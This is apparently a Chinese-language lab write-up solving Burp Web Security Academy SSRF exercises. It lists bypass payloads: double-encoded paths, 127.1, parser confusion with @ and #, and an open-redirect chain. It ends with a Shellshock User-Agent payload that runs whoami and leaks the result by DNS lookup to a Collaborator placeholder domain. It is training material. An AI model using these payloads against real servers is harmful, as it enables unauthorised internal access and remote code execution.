---
title: Ssrf
date: 2023-09-03T15:29:52+08:00
updated: 2023-07-06T20:34:10+08:00
categories: 
- 渗透测试
- brup labs
---

## Basic SSRF against the local server

基础的ssrf，在数量查询位置找到调用的url，修改为

```
http://localhost/admin
```

成功读取的admin页面，在页面源代码中可以找到删除用户调用的api,再次调用该api即可

## Basic SSRF against another back-end system

与上题相同，不过需要通过爆破寻找admin界面

## blacklist-based input filter

简单的ssrf绕过，通过替换localhost为127.1达到绕过的效果，由于后端还存在对admin的监测，我们可以替换为双编码的形式进行绕过

```
http://127.1/%25%36%31dmin/delete?username=carlos
```

## whitelist-based input filter

上传一个

```
http://127.0.0.1
```

发现服务器正在解析该ip，并且提示，host必须为

```
stock.weliketoshop.net
```

这时候就需要用到弱解析器的特点进行绕过，当url中含有@#&等字符时，不同的解析器会解析不同的部分，如果没有严格的验证而是仅检测了是否存在字段，可以利用该特点进行绕过

```
http://localhost%25%32%33@stock.weliketoshop.net/%2561dmin/delete?username=carlos
```

该url被解析为由localhost进行访问

## filter bypass via open redirection vulnerability

在next product处存在一个开放的重定向漏洞，通过指定的的path能够重定向到admin页面，我们可以利用该处，在check处查看到admin页面的回显

```
/product/nextProduct?path=http://192.168.0.12:8080/admin
```

之后进行删除步骤即可

## Blind SSRFwith out-of-band detection

提示在referer获取指定的url,将该url修改为collaborator获取的域名，即可看到一些相关的dns以及http请求信息

## Shellshock exploitation

在referer处存在blind ssrf利用，由于目标端口为8080，我们可以利用shellshock获取rce

```
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```

shell命令在ua处添加，根据提示，在referer处改变访问来源为主机服务

```
http://192.168.0.x
```

爆破1-255的地址即可在collaborator处获取到whoami的命令执行结果
